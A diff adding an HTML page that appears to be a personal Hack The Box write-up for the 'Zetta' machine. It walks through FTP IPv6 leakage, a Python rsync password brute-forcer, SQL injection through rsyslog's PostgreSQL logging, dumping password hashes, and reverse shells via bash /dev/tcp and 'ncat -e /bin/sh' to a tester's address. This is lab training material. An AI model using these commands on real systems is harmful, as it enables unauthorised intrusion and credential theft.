@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+        <title>V01t4ic's HTB Write-ups</title>
+        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" 
+            integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+        <link href="css/style.css" rel="stylesheet">
+        <meta name="description" content="Pen-testing Write-ups and Cheatsheets">
+    </head>
+    <body>
+        <div class="container">
+            <header>
+                <nav>
+                    <div class="container pt-5 px-5 d-flex flex-column flex-md-row justify-content-between bg-white" id="navHeader">
+                        <a class="d-none d-md-inline-block" href='about.html'>About</a>
+                        <a class="d-none d-md-inline-block" href='cheatsheet.html'>Cheatsheet</a>
+                        <a class="d-none d-md-inline-block" data-toggle="collapse" data-target="#writeupsMenu" 
+                            aria-controls="writeupsMenu" aria-expanded="false" aria-label="Toggle writeups menu" href="#">Write-ups</a>
+                    </div>
+                    <div class="collapse bg-white" id="writeupsMenu">
+                        <div class="container pt-1 px-5 flex-md-row bg-white">
+                                <a class="py-2 pr-3 d-none d-md-inline-block" href='htb-zetta.html'>HTB :: Zetta</a>
+                                <a class="py-2 pr-3 d-none d-md-inline-block" href='htb-registry.html'>HTB :: Registry</a>
+                                <a class="py-2 pr-3 d-none d-md-inline-block" href='htb-craft.html'>HTB :: Craft</a>
+                        </div>
+                    </div>
+                </nav>
+            </header>
+            <main>
+                <section class="user-part"> 
+                    <div class="container">
+                        <h2>USER</h2>
+                        <code>
+                            ~$ ifconfig tun0
+                            and grep ipv6 address (dead.beaf:::)
+
+                            to get IPv6 address (base on RFC2428):
+                            ~$ telnet 10.10.10.156 21
+                            user 3xplkP7OxFKotTiEHeNfc2EkrcwOtdQH
+                            pass 3xplkP7OxFKotTiEHeNfc2EkrcwOtdQH
+                            eprt |2|dead:beef::::1|1234|
+                            list
+                        </code>
+                        <p>
+                        I used <span class=code>tcpdump</span> to watch the traffic, then grab the IPv6 remote address.
+
+we can list rsync modules, which include /etc and we can download it except for some files.
+
+rsyncd.conf gives us complete module list which also includes password protected home_roy.
+
+to brute it is possible to use pexpect from python 
+```
+import pexpect
+import sys
+
+
+with open("/usr/share/wordlists/rockyou.txt","r") as rockyou:
+    passwds = list(rockyou.readlines())
+
+for passwd in passwds:
+    passwd = passwd.strip()
+    p = pexpect.spawn('bash -c "RSYNC_PASSWORD=\'%s\' rsync -avzp -6 rsync://roy@[dead:beef::250:56ff:feb9:a064]:8730/home_roy home/"' % (passwd))
+    line = p.read()
+    sys.stdout.write('.')
+    sys.stdout.flush()
+    if not 'ERROR' in line:
+        print("found it: " + passwd)
+        break
+    p.close()
+```
+
+root@rascal:~/htb/boxes/Zetta# python exploit.py                                                                                                                          
+...................................................................................found it: computer
+
+  </div>
+  </section>
+
+## ROOT
+
+
+~$ RSYNC_PASSWORD='computer' rsync -avzp zetta.pub -6 rsync://roy@[dead:beef::250:56ff:feb9:a064]:8730/home_roy/.ssh/authorized_keys
+
+~$ find / -newermt 2019-07-20
+to find several hidden .git repos
+
+
+roy@zetta:/etc/rsyslog.d$ git show
+commit e25cc20218f99abd68a2bf06ebfa81cd7367eb6a (HEAD -> master)
+Author: root <root@zetta.htb>
+Date:   Sat Jul 27 05:51:43 2019 -0400
+
+    Adding/adapting template from manual.
+
+diff --git a/pgsql.conf b/pgsql.conf
+index f31836d..9649f68 100644
+--- a/pgsql.conf
++++ b/pgsql.conf
+@@ -1,5 +1,22 @@
+ ### Configuration file for rsyslog-pgsql
+ ### Changes are preserved
+
+-module (load="ompgsql")
+-*.* action(type="ompgsql" server="localhost" db="Syslog" uid="rsyslog" pwd="")
++# https://www.rsyslog.com/doc/v8-stable/configuration/modules/ompgsql.html
++#
++# Used default template from documentation/source but adapted table
++# name to syslog_lines so the Ruby on Rails application Maurice is
++# coding can use this as SyslogLine object.
++#
++template(name="sql-syslog" type="list" option.sql="on") {
++  constant(value="INSERT INTO syslog_lines (message, devicereportedtime) values ('")
++  property(name="msg")
++  constant(value="','")
++  property(name="timereported" dateformat="pgsql" date.inUTC="on")
++  constant(value="')")
++}
++
++# load module
++module(load="ompgsql")
++
++# Only forward local7.info for testing.
++local7.info action(type="ompgsql" server="localhost" user="postgres" pass="test1234" db="syslog" template="sql-syslog")
+
+
+and here is a way to execute this:
+roy@zetta:~$ logger -p local7.info "', now()); copy (select * from pg_catalog.pg_tables) to \$\$/var/tmp/hereyougo\$\$;-- '"; cat /var/log/postgresql/postgresql-11-main.log;ls /var/tmp
+
+postgres user's hash:
+roy@zetta:/var/tmplogger -p local7.info "', now()); copy (SELECT usename, passwd FROM pg_shadow) to \$\$/var/tmp/hereyougo\$\$;-- '"
+roy@zetta:/var/tmp$ cat /var/tmp/hereyougo 
+postgres        md5743fa0a8feb9a1f8e54b404a98ac6355
+
+improve all this to get reverse shell (just wrapped all this to a file and run with bash):
+echo 'bash -c "bash -i &> /dev/tcp/10.10.14.82/4006 0>&1"' > /var/tmp/sh.sh
+logger -p local7.info "', now());create table t (id text); copy t from program \$\$bash /var/tmp/sh.sh\$\$;drop table t;-- '"
+
+after shell was landed i fetched id_rsa from .ssh of postgres user
+and logged in using normal ssh shell
+
+postgres@zetta:~$ cat .psql_history
+CREATE DATABASE syslog;
+\c syslog
+CREATE TABLE syslog_lines ( ID serial not null primary key, CustomerID bigint, ReceivedAt timestamp without time zone NULL, DeviceReportedTime timestamp without time zone NULL, Facility smallint NULL, Priority smallint NULL, FromHost varchar(60) NULL, Message text, NTSeverity int NULL, Importance int NULL, EventSource varchar(60), EventUser varchar(60) NULL, EventCategory int NULL, EventID int NULL, EventBinaryData text NULL, MaxAvailable int NULL, CurrUsage int NULL, MinUsage int NULL, MaxUsage int NULL, InfoUnitID int NULL , SysLogTag varchar(60), EventLogType varchar(60), GenericFileName VarChar(60), SystemID int NULL);
+\d syslog_lines
+ALTER USER postgres WITH PASSWORD 'sup3rs3cur3p4ass@postgres';
+
+file '/home/roy/.tudu.xml' said something about password scheme represented by '<secret>@userid'
+
+and it turned out that root password is 'sup3rs3cur3p4ass@root'
+
+..rooted!
+            </main>
+        </div>
+        <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" 
+            integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
+        <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" 
+            integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" 
+            integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+    </body>
+</html>
+
+
+PS.
+logger -p local7.info "pg_exec',\$\$2019-09-01 07:55:02\$\$); CREATE FUNCTION sys(cstring) RETURNS int AS $\$/tmp/pg_exec.so$\$, $\$pg_exec$\$ LANGUAGE $\$c$\$ STRICT; -- " logger -p local7.info "pg_exec',\$\$2019-09-01 07:55:02\$\$); select sys($\$/tmp/ncat -e /bin/sh 10.10.14.28 8888$\$); -- " 
